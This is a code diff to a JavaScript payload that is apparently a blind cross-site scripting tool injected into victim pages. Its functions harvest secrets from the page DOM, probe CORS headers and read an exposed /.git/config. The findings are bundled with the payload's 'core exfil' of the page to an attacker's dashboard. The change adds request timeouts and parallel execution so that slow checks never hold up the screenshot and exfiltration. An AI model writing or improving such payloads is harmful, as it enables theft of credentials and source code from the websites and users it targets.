@@ -209,8 +209,12 @@ function look_for_secrets(data) {
 async function check_cors() {
 	// Non-null result = page sends Access-Control-Allow-Origin header,
 	// which may allow attacker-controlled origins to read sensitive content.
+	// AbortController ensures we don't hang indefinitely waiting for a response.
 	try {
-		var res = await fetch(location.href, { method: 'HEAD' });
+		var ctrl = new AbortController();
+		var tid  = setTimeout(function() { ctrl.abort(); }, 3000);
+		var res  = await fetch(location.href, { method: 'HEAD', signal: ctrl.signal });
+		clearTimeout(tid);
 		for (var header of res.headers) {
 			if (header[0].toLowerCase() === 'access-control-allow-origin') {
 				return header[1];
@@ -223,8 +227,13 @@ async function check_cors() {
 async function check_git() {
 	// Checks whether /.git/config is publicly accessible — indicates
 	// source code exposure on misconfigured servers.
+	// AbortController ensures we don't hang indefinitely waiting for a response.
 	try {
-		var res = await fetch(location.protocol + '//' + location.host + '/.git/config');
+		var ctrl = new AbortController();
+		var tid  = setTimeout(function() { ctrl.abort(); }, 3000);
+		var res  = await fetch(location.protocol + '//' + location.host + '/.git/config',
+		                       { signal: ctrl.signal });
+		clearTimeout(tid);
 		var text = await res.text();
 		if (text.startsWith('[core]')) {
 			return text.substring(0, 2000);
@@ -384,11 +393,15 @@ async function hook_load_if_not_ready() {
         var raw_dom = '';
         try { raw_dom = never_null( document.documentElement.outerHTML ); } catch ( e ) {}
 
-        // Intelligence checks — best-effort, must not block the core exfil.
+        // Intelligence checks — best-effort, run in parallel with per-request
+        // timeouts so a hanging fetch never blocks screenshot/exfil.
         var intel = {};
         try { intel['secrets'] = look_for_secrets(raw_dom); } catch(e) { intel['secrets'] = []; }
-        try { intel['cors']        = await check_cors(); }  catch(e) { intel['cors'] = null; }
-        try { intel['git_exposed'] = await check_git(); }   catch(e) { intel['git_exposed'] = null; }
+        try {
+            var _intel_results = await Promise.allSettled([ check_cors(), check_git() ]);
+            intel['cors']        = _intel_results[0].status === 'fulfilled' ? _intel_results[0].value : null;
+            intel['git_exposed'] = _intel_results[1].status === 'fulfilled' ? _intel_results[1].value : null;
+        } catch(e) { intel['cors'] = null; intel['git_exposed'] = null; }
 
         // Prepend findings as an HTML comment so they appear in the dashboard
         // DOM viewer without any server-side schema changes.
